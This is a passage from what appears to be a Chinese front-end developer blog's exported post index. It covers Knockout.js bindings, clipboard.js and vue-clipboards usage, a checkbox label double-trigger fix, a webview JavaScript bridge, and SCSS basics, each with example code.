    <content type="text"><![CDATA[HTML1234567891011121314151617181920212223242526&lt;div&gt; &lt;!-- 载入tempalte模板，name属性对应module Id --&gt; &lt;div data-bind="template: &#123;name: 'testTemplate1', if: showModuleIndex() === 1&#125;"&gt;&lt;/div&gt; &lt;div data-bind="template: &#123;name: 'testTemplate2', if: showModuleIndex() === 2&#125;"&gt;&lt;/div&gt;&lt;/div&gt;&lt;!-- module1 --&gt;&lt;script id="testTemplate1" type="text/html"&gt; &lt;div&gt; &lt;h2 data-bind="text: title1"&gt;&lt;/h2&gt; &lt;p data-bind="text: para1"&gt;&lt;/p&gt; 请输入姓名：&lt;input type="text" data-bind="value: inputText1, valueUpdate: 'keyup'"&gt;&lt;br&gt; &lt;p data-bind="text: inputText"&gt;&lt;/p&gt; &lt;button&gt;提交&lt;/button&gt; &lt;/div&gt;&lt;/script&gt;&lt;!-- module2 --&gt;&lt;script id="testTemplate2" type="text/html"&gt; &lt;div&gt; &lt;h2 data-bind="text: title2"&gt;&lt;/h2&gt; &lt;p data-bind="text: para2"&gt;&lt;/p&gt; 请输入姓名：&lt;input type="text" data-bind="value: inputText2, valueUpdate: 'keyup'"&gt;&lt;br&gt; &lt;button&gt;提交&lt;/button&gt; &lt;/div&gt;&lt;/script&gt; JS 写法1: 属性法 1234567891011121314151617var viewModel = function () &#123; var self = this; self.title1 = ko.observable('我就是模板标题1'); self.title2 = ko.observable('我就是模板标题2'); self.para1 = ko.observable('我是段落1'); self.para2 = ko.observable('我是段落2'); self.inputText1 = ko.observable(''); self.inputText2 = ko.observable(''); self.showModuleIndex = ko.observable(1); self.showModule = function (index, data) &#123; self.showModuleIndex(index); &#125;;&#125;;ko.applyBindings(viewModel(), document.getElementById('body')); 写法2: extend法 123456789101112131415161718var viewModel = function () &#123; var self = this; $.extend(self, &#123; title1: ko.observable('我就是模板标题1'), title2: ko.observable('我就是模板标题2'), para1: ko.observable('我是段落1'), para2: ko.observable('我是段落2'), inputT: ko.observable(''), inputT: ko.observable(''), showModuleIndex: ko.observable(1), showModule: function (index, data) &#123; self.showModuleIndex(index); &#125;, &#125;)；&#125;;ko.applyBindings(new viewModel(), document.getElementById('body'));]]></content>
      <tags>
        <tag>KnockOut</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[viewport各宽高值]]></title>
    <url>%2Fblog%2Fhtml%2Fviewport%E5%90%84%E5%AE%BD%E9%AB%98%E5%80%BC.html</url>
    <content type="text"><![CDATA[js中viewport的各个宽高值如下：]]></content>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[knockout模板绑定和控制语法]]></title>
    <url>%2Fblog%2Fknockout%2Fknockout%E6%A8%A1%E6%9D%BF%E7%BB%91%E5%AE%9A%E5%92%8C%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5.html</url>
    <content type="text"><![CDATA[常见方法text123name(&apos;哈哈&apos;);&lt;p data-bind=&quot;text: name&quot;&gt;&lt;/p&gt; html123errorText(&apos;第1行有name错误&lt;br&gt;第二行有id不匹配&apos;);&lt;p data-bind=&quot;html: errorText&quot;&gt;&lt;/p&gt; visible123isShow(true);&lt;div data-bind=&quot;visible: isShow&quot;&gt;哈哈，看见我了&lt;/div&gt; if1234567891011写法1：isShow(true);&lt;div data-bind=&quot;if: isShow&quot;&gt;哈哈，看见我了&lt;/div&gt;写法2：isShow(false);&lt;!-- ko if:isShow --&gt;&lt;div&gt;哈哈，看见我了&lt;/div&gt;&lt;!-- /ko --&gt; ifnot字面意思，if取反 if和visible的区别if不显示时dom不存在，visible存在 css(class)123profitWarning(-50);&lt;div data-bind=&quot;css: &#123;profitWarning: currentProfit() &lt; 0&#125;&quot;&gt;&lt;/div&gt; style123profitWarning(-50);&lt;div data-bind=&quot;style: &#123;color: currentProfit() &lt; 0 ? &apos;red&apos; : &apos;black&apos;, fontWeight: isSevere() ? &apos;bold&apos; : &apos;&apos;&#125;&quot;&gt;&lt;/div&gt; attr1234url(&apos;http://www.****&apos;);detail(&apos;我是title&apos;);&lt;a href=&quot;&quot; data-bind=&quot;attr: &#123;href: url, title: details&#125;&quot;&gt;&lt;/a&gt; foreachforeach遍历简单数组1234567891011&lt;ul data-bind=&quot;foreach: months&quot;&gt; &lt;li&gt; The current item is: &lt;b data-bind=&quot;text: $data&quot;&gt;&lt;/b&gt; &lt;/li&gt;&lt;/ul&gt;&lt;script type=&quot;text/javascript&quot;&gt; ko.applyBindings(&#123; months: [ &apos;Jan&apos;, &apos;Feb&apos;, &apos;Mar&apos;, &apos;etc&apos; ] &#125;);&lt;/script&gt; foreach遍历复杂数组123456789101112131415161718192021222324252627282930313233343536373839&lt;div data-bind=&quot;foreach: teacherList&quot;&gt; &lt;p&gt; 索引:&lt;span data-bind=&quot;text: $index&quot;&gt;&lt;/span&gt; teacherID:&lt;span data-bind=&quot;text: teacheId&quot;&gt;&lt;/span&gt; teacherName:&lt;span data-bind=&quot;text: teacheName&quot;&gt;&lt;/span&gt; &lt;button data-bind=&quot;click: $parent.removeMe&quot;&gt;删除&lt;/button&gt; &lt;/p&gt; &lt;button data-bind=&quot;click: addOne&quot;&gt;增加&lt;/button&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt; function AppViewModel() &#123; var self = this; self.teacherList([ &#123; teacheId: &apos;001&apos;, teacheName: &apos;哈哈&apos; &#125;, &#123; teacheId: &apos;002&apos;, teacheName: &apos;嘻嘻&apos; &#125;, &#123; teacheId: &apos;003&apos;, teacheName: &apos;呵呵&apos; &#125; ]); self.removeMe = function () &#123; self.teacherList.remove(this); &#125;; self.addOne = function () &#123; self.teacherList.push(&#123; teacheId: &apos;004&apos;, teacheName: &apos;喔喔&apos; &#125;) &#125; &#125; ko.applyBindings(new AppViewModel());&lt;/script&gt; foreach注释语法123456789101112&lt;ul&gt; &lt;li class=&quot;header&quot;&gt;Header item&lt;/li&gt; &lt;!-- ko foreach: myItems --&gt; &lt;li&gt;Item &lt;span data-bind=&quot;text: $data&quot;&gt;&lt;/span&gt;&lt;/li&gt; &lt;!-- /ko --&gt;&lt;/ul&gt;&lt;script type=&quot;text/javascript&quot;&gt; ko.applyBindings(&#123; myItems: [ &apos;A&apos;, &apos;B&apos;, &apos;C&apos; ] &#125;);&lt;/script&gt; with控制流wtih正常写法1234567891011121314151617当父级是ko对象，子级是非ko对象，在模板中我们不能直接查找子级a().b()，这样是不OK得，我们可以借助with语法实现这种情况的渲染，父级with:a()，然后就可以直接使用子级了&lt;h1 data-bind=&quot;text: city&quot;&gt; &lt;/h1&gt;&lt;p data-bind=&quot;with: coords&quot;&gt; Latitude: &lt;span data-bind=&quot;text: latitude&quot;&gt; &lt;/span&gt;, Longitude: &lt;span data-bind=&quot;text: longitude&quot;&gt; &lt;/span&gt;&lt;/p&gt; &lt;script type=&quot;text/javascript&quot;&gt; ko.applyBindings(&#123; city: &quot;London&quot;, coords: &#123; latitude: 51.5001524, longitude: -0.1262362 &#125; &#125;);&lt;/script&gt; with注释写法1234567891011121314151617181920&lt;ul&gt; &lt;li&gt;Header element&lt;/li&gt; &lt;!-- ko with: outboundFlight --&gt; &lt;div data-bind=&quot;text: outsize&quot;&gt;&lt;/div&gt; &lt;!-- /ko --&gt; &lt;!-- ko with: inboundFlight --&gt; &lt;div data-bind=&quot;text: insize&quot;&gt;&lt;/div&gt; &lt;!-- /ko --&gt;&lt;/ul&gt;&lt;script type=&quot;text/javascript&quot;&gt; ko.applyBindings(&#123; outboundFlight: &#123; outsize: 51.5001524 &#125;, inboundFlight: &#123; insize: 32.2323423 &#125; &#125;);&lt;/script&gt; form场景click123456789101112写法1：渲染时执行&lt;button data-bind=&quot;click: clickBtn&quot;&gt;&lt;/button&gt;写法2：带bind，不触发不执行&lt;button data-bind=&quot;click: clickBtn.bind($data)&quot;&gt;&lt;/button&gt;注意：点击方法前可能得加$root、$parent等前缀，示层级而定也可以将点击事件包装起来：写法3：&lt;button data-bind=&quot;click: function(data, event) &#123; myFunction(&apos;param1&apos;, &apos;param2&apos;, data, event) &#125;&quot;&gt;&lt;/button&gt; event表单事件123456789101112131415161718192021&lt;div&gt; &lt;div data-bind=&quot;event: &#123; mouseover: enableDetails, mouseout: disableDetails &#125;&quot;&gt; Mouse over me &lt;/div&gt; &lt;div data-bind=&quot;visible: detailsEnabled&quot;&gt; Details &lt;/div&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot;&gt; var viewModel = &#123; detailsEnabled: ko.observable(false), enableDetails: function() &#123; this.detailsEnabled(true); &#125;, disableDetails: function() &#123; this.detailsEnabled(false); &#125; &#125;; ko.applyBindings(viewModel);&lt;/script&gt; submit表单提交123456789101112&lt;form data-bind=&quot;submit: doSomething&quot;&gt; ... form contents go here ... &lt;button type=&quot;submit&quot;&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;script type=&quot;text/javascript&quot;&gt; var viewModel = &#123; doSomething : function(formElement) &#123; // ... now do something &#125; &#125;;&lt;/script&gt; enable or disable表单禁用123456789101112131415&lt;p&gt; &lt;input type=&apos;checkbox&apos; data-bind=&quot;checked: hasCellphone&quot; /&gt; I have a cellphone&lt;/p&gt;&lt;p&gt; Your cellphone number: &lt;input type=&apos;text&apos; data-bind=&quot;value: cellphoneNumber, enable: hasCellphone&quot; /&gt;&lt;/p&gt; &lt;script type=&quot;text/javascript&quot;&gt; var viewModel = &#123; hasCellphone : ko.observable(false), cellphoneNumber: &quot;&quot; &#125;;&lt;/script&gt; value or textInput表单输入1234567891011textInput同value的性质是一致的，但是textInput是在view改变之后，model立即改变，达到即时更新。&lt;p&gt;Login name: &lt;input data-bind=&quot;value: userName&quot; /&gt;&lt;/p&gt;&lt;p&gt;Password: &lt;input type=&quot;password&quot; data-bind=&quot;value: userPassword&quot; /&gt;&lt;/p&gt; &lt;script type=&quot;text/javascript&quot;&gt; var viewModel = &#123; userName: ko.observable(&quot;&quot;), // Initially blank userPassword: ko.observable(&quot;abc&quot;), // Prepopulate &#125;;&lt;/script&gt; hasFocus表单聚焦123456789101112131415判断表单是否激活，处理不同情况，可点击按钮手动触发激活输入框&lt;input data-bind=&quot;hasFocus: isSelected&quot; /&gt;&lt;button data-bind=&quot;click: setIsSelected&quot;&gt;Focus programmatically&lt;/button&gt;&lt;span data-bind=&quot;visible: isSelected&quot;&gt;The textbox has focus&lt;/span&gt;&lt;script type=&quot;text/javascript&quot;&gt; var viewModel = &#123; isSelected: ko.observable(false), setIsSelected: function() &#123; this.isSelected(true) &#125; &#125;; ko.applyBindings(viewModel);&lt;/script&gt; checked单选框复选框被选中1234567891011根据变量来控制复选框的选中与否&lt;p&gt;Send me spam: &lt;input type=&quot;checkbox&quot; data-bind=&quot;checked: wantsSpam&quot; /&gt;&lt;/p&gt; &lt;script type=&quot;text/javascript&quot;&gt; var viewModel = &#123; wantsSpam: ko.observable(true) // Initially checked &#125;; // ... then later ... viewModel.wantsSpam(false); // The checkbox becomes unchecked&lt;/script&gt; select option下拉框简单遍历-单选1234567891011121314&lt;p&gt; Destination country: &lt;select data-bind=&quot;options: availableCountries&quot;&gt;&lt;/select&gt;&lt;/p&gt; &lt;script type=&quot;text/javascript&quot;&gt; var viewModel = &#123; // These are the initial options availableCountries: ko.observableArray([&apos;France&apos;, &apos;Germany&apos;, &apos;Spain&apos;]) &#125;; // ... then later ... viewModel.availableCountries.push(&apos;China&apos;); // Adds another option&lt;/script&gt; 简单遍历-多选12345678910&lt;p&gt; Choose some countries you would like to visit: &lt;select data-bind=&quot;options: availableCountries&quot; size=&quot;5&quot; multiple=&quot;true&quot;&gt;&lt;/select&gt;&lt;/p&gt; &lt;script type=&quot;text/javascript&quot;&gt; var viewModel = &#123; availableCountries: ko.observableArray([&apos;France&apos;, &apos;Germany&apos;, &apos;Spain&apos;]) &#125;;&lt;/script&gt; 复杂遍历123456789101112131415161718192021222324252627282930313233343536373839options: 表示遍历的数组项，如果层级很深，可以在外层考虑绑定with，实现简化层级optionsText: 下拉框展示的文案，及数组中某一项的某个字段value: 当前文案optionsCaption: 默认显示的文案，改默认文案不对应任何值event-change: 下拉框触发改变&lt;p&gt; Your country: &lt;select data-bind=&quot;options: availableCountries, optionsText: &apos;countryName&apos;, value: selectedCountry, optionsCaption: &apos;Choose...&apos;, event: &#123;change: selectChange&#125;&quot;&gt;&lt;/select&gt;&lt;/p&gt; &lt;div data-bind=&quot;visible: selectedCountry&quot;&gt; &lt;!-- Appears when you select something --&gt; You have chosen a country with population &lt;span data-bind=&quot;text: selectedCountry() ? selectedCountry().countryPopulation : &apos;unknown&apos;&quot;&gt;&lt;/span&gt;.&lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; // Constructor for an object with two properties var Country = function(name, population) &#123; this.countryName = name; this.countryPopulation = population; &#125;; var viewModel = &#123; availableCountries : ko.observableArray([ new Country(&quot;UK&quot;, 65000000), new Country(&quot;USA&quot;, 320000000), new Country(&quot;Sweden&quot;, 29000000) ]), selectedCountry : ko.observable(), // Nothing selected by default selectChange: function () &#123; alert(&apos;下拉框变化了&apos;); &#125; &#125;;&lt;/script&gt; 多级下拉框123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131对于像三级城市列表那种的下拉框，每一个下拉框的改变都需要刷新下一个下拉框或页面的数据，select之间必须联动，此例我故意将城市数据层级设置城多级&lt;p data-bind=&quot;text: para()&quot;&gt;&lt;/p&gt;&lt;!-- ko with:bigData().smallData --&gt; &lt;select data-bind=&quot;options: provinces, optionsText: &apos;provinceName&apos;, value: $root.firstValue, optionsCaption: &apos;选择省份&apos;, event: &#123;change: firstSelectChange&#125;&quot;&gt;&lt;/select&gt;&lt;!-- /ko --&gt;&lt;!-- ko with: $root.firstValue --&gt; &lt;select data-bind=&quot;options: citys, optionsText: &apos;cityName&apos;, value: $root.secondValue, optionsCaption: &apos;选择城市&apos;, event: &#123;change: secondSelectChange&#125;&quot;&gt;&lt;/select&gt;&lt;!-- /ko --&gt; &lt;!-- ko with: $root.secondValue --&gt; &lt;select data-bind=&quot;options: countys, optionsText: &apos;countyName&apos;, value: $root.thirdValue, optionsCaption: &apos;选择地区&apos;, event: &#123;change: thirdSelectChange&#125;&quot;&gt;&lt;/select&gt;&lt;!-- /ko --&gt;&lt;button data-bind=&quot;click: commit&quot;&gt;提交&lt;/button&gt;&lt;script type=&quot;text/javascript&quot;&gt; var viewModel = &#123; para: ko.observable(&apos;没错，我就是那个动态标题！&apos;), bigData: ko.observable(&#123; smallData: &#123; provinces: [ &#123; provinceId: &apos;010000&apos;, provinceName: &apos;北京&apos;, citys: [ &#123; cityId: &apos;010100&apos;, cityName: &apos;北京市&apos;, countys: [ &#123; countyId: &apos;010101&apos;, countyName: &apos;东城区&apos; &#125;, &#123; countyId: &apos;010102&apos;, countyName: &apos;西城区&apos; &#125; ] &#125; ] &#125;, &#123; provinceId: &apos;090000&apos;, provinceName: &apos;江西省&apos;, citys: [ &#123; cityId: &apos;090100&apos;, cityName: &apos;南昌市&apos;, countys: [ &#123; countyId: &apos;090101&apos;, countyName: &apos;东湖区&apos; &#125;, &#123; countyId: &apos;090102&apos;, countyName: &apos;西湖区&apos; &#125; ] &#125;, &#123; cityId: &apos;090200&apos;, cityName: &apos;九江市&apos;, countys: [ &#123; countyId: &apos;090201&apos;, countyName: &apos;浔阳区&apos; &#125; ] &#125;, &#123; cityId: &apos;090300&apos;, cityName: &apos;景德镇市&apos;, countys: [ &#123; countyId: &apos;090201&apos;, countyName: &apos;珠江区&apos; &#125; ] &#125; ] &#125; ] &#125; &#125;), firstValue: ko.observable(&apos;&apos;), secondValue: ko.observable(&apos;&apos;), thirdValue: ko.observable(&apos;&apos;) &#125;; var firstSelectChange = function () &#123; window.alert(&apos;点击了1号下拉框&apos;); &#125;; var secondSelectChange = function () &#123; window.alert(&apos;点击了2号下拉框&apos;); &#125;; var thirdSelectChange = function () &#123; window.alert(&apos;点击了3号下拉框&apos;); &#125;; var commit = function () &#123; window.alert(&apos;我选择了：&apos; + viewModel.firstValue().provinceName + &apos;--&apos; + viewModel.secondValue().cityName + &apos;--&apos; + viewModel.thirdValue().countyName); &#125;; // 初始化数据（如果不加初始化数据，默认只出现第一个下拉框，选择后出现第二个，再选择出现第三个） for (var i in viewModel.bigData().smallData.provinces) &#123; if (viewModel.bigData().smallData.provinces[i].provinceId === &apos;010000&apos;) &#123; viewModel.firstValue(viewModel.bigData().smallData.provinces[i]); // break; &#125; for (var j in viewModel.bigData().smallData.provinces[i].citys) &#123; if (viewModel.bigData().smallData.provinces[i].citys[j].cityId === &apos;010100&apos;) &#123; viewModel.secondValue(viewModel.bigData().smallData.provinces[i].citys[j]); // break; &#125; &#125; &#125; ko.applyBindings(viewModel);&lt;/script&gt;]]></content>
      <tags>
        <tag>KnockOut</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[knockout初始化]]></title>
    <url>%2Fblog%2Fknockout%2Fknockout%E5%88%9D%E5%A7%8B%E5%8C%96.html</url>
    <content type="text"><![CDATA[KnockOut是一个优秀的MVVM JavaScript库，由微软提出。虽然语法相较于目前市面上的Vue、React稍稍落后，但是好在兼容性极好，兼容到IE6，是一些兼容性要求高的开发首选。 KnockOut官方文档：http://knockoutjs.com/index.htmlCDN:https://cdn.bootcss.com/knockout/3.4.2/knockout-min.js demo1(变量式绑定)12345&lt;h3&gt;1、变量式绑定&lt;/h3&gt;&lt;p&gt;First Name : &lt;span data-bind="text: firstName1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Last Name : &lt;span data-bind="text: lastName1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Last Name : &lt;input data-bind="value: firstName1" /&gt;&lt;/p&gt;&lt;p&gt;Last Name : &lt;input data-bind="value: lastName1" /&gt;&lt;/p&gt; 123456789101112var viewmodel1 = &#123; // 单向绑定 // firstName: 'John1', // lastName: 'Pei1' // 双向绑定 firstName1: ko.observable('John1'), lastName1: ko.observable('Pei1')&#125;// 开始绑定ko.applyBindings(viewmodel1); demo2(函数式绑定)12345&lt;h3&gt;1、变量式绑定&lt;/h3&gt;&lt;p&gt;First Name : &lt;span data-bind="text: firstName2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Last Name : &lt;span data-bind="text: lastName2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Last Name : &lt;input data-bind="value: firstName2" /&gt;&lt;/p&gt;&lt;p&gt;Last Name : &lt;input data-bind="value: lastName2" /&gt;&lt;/p&gt; 12345678function viewModel2() &#123; // this.firstName2 = 'John2' // this.lastName2 = 'Pei2' this.firstName2 = ko.observable('John2'); this.lastName2 = ko.observable('Pei2');&#125;ko.applyBindings(viewModel2());]]></content>
      <tags>
        <tag>KnockOut</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决checkbox复选框点击label会触发两次的bug]]></title>
    <url>%2Fblog%2Fjavascript%2F%E8%A7%A3%E5%86%B3checkbox%E5%A4%8D%E9%80%89%E6%A1%86%E7%82%B9%E5%87%BBlabel%E8%A7%A6%E5%8F%91%E4%B8%A4%E6%AC%A1bug.html</url>
    <content type="text"><![CDATA[通常我们使用checkbox的时候都会增加一个label帮助点击，如1234&lt;div id=&quot;box&quot; @click=&quot;selectCheckbox($event)&quot;&gt; &lt;input type=&quot;checkbox&quot;&gt; &lt;label for=&quot;&quot;&gt;click checkbox&lt;/label&gt;&lt;/div&gt; 点击当我们需要js去处理相应的点击事件时，我们会发现点击checkbox复选框本身并无问题，但是点击label时会发生事件冒泡触发两次的bug，解决办法： 1、去除label，呵呵，没意思 2、点击div的时候，判断事件源，忽略label事件源12345678910111213141516171819selectCheckbox: function selectCheckbox (event) &#123; // 根据事件源阻止label事件会触发两次的bug var ev = event || window.event; var eTarget = ev.target || ev.srcElement; if (!$(eTarget).is('input')) return false; // 正常处理 // 判断是否选中 var isSelect = $('#box').find('input').is(":checked"); // var isSelect = $('#box').find('input').prop("checked"); if (isSelect) &#123; // 如果是勾选 console.log('勾选'); // request &#125; else &#123; // 如果是去除 console.log('去除'); // request &#125;&#125;]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js脚本实现复制剪切效果]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E5%A4%8D%E5%88%B6%E5%89%AA%E5%88%87.html</url>
    <content type="text"><![CDATA[参考：https://github.com/cpm828/clipboard.jsCDN:http://cdn.bootcss.com/clipboard.js/1.5.12/clipboard.min.js 1234567data-clipboard-action: 操作行为，默认为copy，剪切为cutdata-clipboard-target: 操作目标，通过标签、id或class号指向data-clipboard-text: 具体文本e.action: 操作名称e.text: 操作的文本e.trigger: dom节点 常用方法： 复制 1234567891011121314151617&lt;p class="para"&gt;123456789&lt;/p&gt;&lt;button class="btn1" data-clipboard-target=".para"&gt;复制&lt;/button&gt;&lt;script&gt;var clipboard1 = new Clipboard('.btn1');clipboard1.on('success', function(e) &#123; console.info('Action:', e.action); // 操作名称 console.info('Text:', e.text); // 操作的文本 console.info('Trigger:', e.trigger); // dom节点 e.clearSelection(); // 取消选中&#125;);clipboard1.on('error', function(e) &#123; console.error('Action:', e.action); console.error('Trigger:', e.trigger);&#125;);&lt;/script&gt; 剪切 1234567891011121314151617&lt;input type="text" class="input" value="我就是那个input"&gt;&lt;button class="btn2" data-clipboard-action="cut" data-clipboard-target=".input"&gt;剪切&lt;/button&gt;&lt;script&gt;var clipboard2 = new Clipboard('.btn2');clipboard2.on('success', function(e) &#123; console.info('Action:', e.action); // 操作名称 console.info('Text:', e.text); // 操作的文本 console.info('Trigger:', e.trigger); // dom节点 e.clearSelection(); // 取消选中&#125;);clipboard2.on('error', function(e) &#123; console.error('Action:', e.action); console.error('Trigger:', e.trigger);&#125;);&lt;/script&gt; 复制固定文本 123456789101112131415&lt;button class="btn3" data-clipboard-text="我就是那个隐藏的文字"&gt;复制固定数据&lt;/button&gt;&lt;script&gt;var clipboard3 = new Clipboard('.btn3');clipboard3.on('success', function(e) &#123; console.info('Action:', e.action); // 操作名称 console.info('Text:', e.text); // 操作的文本 console.info('Trigger:', e.trigger); // dom节点 e.clearSelection(); // 取消选中&#125;);clipboard3.on('error', function(e) &#123; console.error('Action:', e.action); console.error('Trigger:', e.trigger);&#125;);&lt;/script&gt; 动态将目标指向下一个节点 123456789&lt;button class="btn4"&gt;看我如下操作下一个节点&lt;/button&gt;&lt;script&gt;new Clipboard('.btn4', &#123; target: function(trigger) &#123; return trigger.nextElementSibling; // 动态指向下一个节点，及操作下一个节点 &#125;&#125;);&lt;/script&gt; 动态操作属性值 123456789&lt;button class="btn5" aria-label="我用了自己的属性"&gt;看我如何复制我的属性值&lt;/button&gt;&lt;script&gt;new Clipboard('.btn5', &#123; text: function(trigger) &#123; return trigger.getAttribute('aria-label'); // 操作属性值 &#125;&#125;)&lt;/script&gt; 在vue项目中，使用如上方法，ios会有bug，可以安装vue-cliboards组件 参考：https://github.com/cpm828/vue-clipboards 1、安装vue-clipboards1npm install vue-clipboards 2、导入（可放在组件中也可放在main.js中）123import Vue from &apos;vue&apos;import VueClipboards from &apos;vue-clipboards&apos;Vue.user(VueClipboards) 3、使用1234567891011121314151617&lt;button v-clipboard=&quot;copyData&quot; @success=&quot;handleSuccess&quot; @error=&quot;handleError&quot;&gt;Copy&lt;/button&gt;new Vue(&#123; data() &#123; return &#123; copyData: &apos;copy data&apos; &#125; &#125;, methods: &#123; handleSuccess(e) &#123; console.log(e); &#125;, handleError(e) &#123; console.log(e); &#125; &#125;&#125;); 4、说明该组件默认只能绑定一个 解决办法： 4.1 增加:key=”1” 12&lt;button v-clipboard=&quot;copyData1&quot; :key=&quot;1&quot; @success=&quot;handleSuccess&quot; @error=&quot;handleError&quot;&gt;Copy&lt;/button&gt;&lt;button v-clipboard=&quot;copyData2&quot; :key=&quot;2&quot; @success=&quot;handleSuccess&quot; @error=&quot;handleError&quot;&gt;Copy&lt;/button&gt; 具体见：https://github.com/zhuowenli/vue-clipboards/blob/master/example/App.vue#L8 4.2 可以考虑设置一个真实复制的按钮，其他按钮trigger click给这个按钮]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webview页面js与客户端进行交互]]></title>
    <url>%2Fblog%2Fjavascript%2Fwebview%E9%A1%B5%E9%9D%A2js%E4%B8%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BA%A4%E4%BA%92.html</url>
    <content type="text"><![CDATA[有时我们需要开发一些页面放在爱啪啪内，我们称之为webview页面，既然是在爱啪啪内，就有可能与客户端进行一些常见的交互，如调用客户端的一些方法 我们可以做： 新建jsbridge.js，这样做的理由是将所有的jsbridge放置在此文件中，便于后期维护 下面是一些常用的方法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859const ua = window.navigator.userAgentconst isIOS = /iphone/i.test(ua)const TAG = 'jlhb'// ios bridgefunction connectBridge (callback) &#123; if (window.WebViewJavascriptBridge) &#123; return callback(window.WebViewJavascriptBridge) &#125; if (window.WVJBCallbacks) &#123; return window.WVJBCallbacks.push(callback) &#125; window.WVJBCallbacks = [callback] var WVJBIframe = document.createElement('iframe') WVJBIframe.style.display = 'none' WVJBIframe.src = 'https://__bridge_loaded__' document.documentElement.appendChild(WVJBIframe) setTimeout(function () &#123; document.documentElement.removeChild(WVJBIframe) &#125;, 0)&#125;// 下载图片,type: 0/相册function downloadImage (imgUrl, type) &#123; isIOS ? connectBridge(bridge =&gt; &#123; bridge.callHandler('downloadImage', imgUrl, type) &#125;) : window.HyhbInteraction.downloadImage(imgUrl, type)&#125;// 分享图片function shareImage (imgUrl) &#123; isIOS ? connectBridge(bridge =&gt; &#123; bridge.callHandler('shareImage', imgUrl) &#125;) : window.HyhbInteraction.shareImage(imgUrl)&#125;// 我的战绩function goRecord (numId) &#123; isIOS ? connectBridge(bridge =&gt; &#123; bridge.callHandler('goRecord', numId) &#125;) : window.HyhbInteraction.goRecord(numId)&#125;// push dataif (isIOS) &#123; // iOS connectBridge(bridge =&gt; &#123; bridge.callHandler('setJpushTags', TAG, (response) =&gt; &#123; &#125;) bridge.registerHandler('pushData', (data) =&gt; &#123; window.pushData(data) &#125;) bridge.registerHandler('setLuckbean', (data) =&gt; &#123; window.setLuckbean(data) // ios在回调中调用index.html下的setLuckbean()方法，安卓会自动查找并调用 &#125;) &#125;)&#125; else &#123; // 安卓 window.HyhbInteraction.setJpushTags(TAG)&#125;export &#123; downloadImage, shareImage, goRecord&#125; 注：HyhbInteraction 是安卓端设置的app的interaction名称]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scss用法]]></title>
    <url>%2Fblog%2Fcss%2Fscss%E8%AF%AD%E6%B3%95.html</url>
    <content type="text"><![CDATA[变量sass中可以定义变量，方便统一修改和维护1234567$fontStack: Helvetica, sans-serif;$primaryColor: #333;body &#123; font-family: $fontStack; color: $primaryColor;&#125; 转换成： 1234body &#123; font-family: Helvetica, sans-serif; color: #333;&#125; 嵌套sass可以进行选择器的嵌套，表示层级关系，看起来很优雅整齐1234567891011nav &#123; background: red; ul &#123; margin: 0; padding: 0; list-style: none; li &#123; display: inline-block; &#125; &#125;&#125; 转换成： 1234567891011nav &#123; background: red;&#125;nav ul &#123; margin: 0; padding: 0; list-style: none;&#125;nav ul li &#123; display: inline-block;&#125; 导入sass中如导入其他sass文件，最后编译为一个css文件，优于纯css的@import123456789101112131415_reset.css如下：html,body,ul,ol &#123; margin: 0; padding: 0;&#125;base.css如下：@import 'reset';body &#123; font-size: 100% Helvetica, sans-serif; background-color: #efefef;&#125; 转换后： 12345678html, body, ul, ol &#123; margin: 0; padding: 0;&#125;body &#123; background-color: #efefef; font-size: 100% Helvetica, sans-serif;&#125; mixin混合sass中可用mixin定义一些代码片段，且可传参数，方便日后根据需求调用。从此处理css3的前缀兼容轻松便捷。 适用于css3加厂商前缀、加背景图、设置宽高等123456789@mixin box-sizing ($sizing) &#123; -webkit-box-sizing:$sizing; -moz-box-sizing:$sizing; box-sizing:$sizing;&#125;.box-border&#123; border:1px solid #ccc; @include box-sizing(border-box);&#125; 转换成： 123456.box-border &#123; border: 1px solid #ccc; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box;&#125; 扩展/继承sass可通过@extend来实现代码组合声明，使代码更加优越简洁。123456789.message &#123; border: 1px solid #ccc; padding: 10px; color: #333;&#125;.success &#123; @extend .message; //表示公用message的样式 border-color: green;&#125; 转换成： 12345678.message, .success &#123; border: 1px solid #cccccc; padding: 10px; color: #333;&#125;.success &#123; border-color: green;&#125; 运算sass可进行简单的加减乘除运算等123article &#123; width: 600px / 960px * 100%;&#125; 转换成： 123article&#123; width: 62.5%;&#125; ##颜色sass中集成了大量的颜色函数，让变换颜色更加简单12345678$linkColor: #08c;a &#123; text-decoration:none; color:$linkColor; &amp;:hover&#123; color:darken($linkColor,10%); &#125;&#125; 转换成： 1234567a &#123; text-decoration: none; color: #0088cc;&#125;a:hover &#123; color: #006699;&#125;]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用数组方法]]></title>
    <url>%2Fblog%2Fjavascript%2F%E5%B8%B8%E7%94%A8%E6%95%B0%E7%BB%84%E6%96%B9%E6%B3%95.html</url>
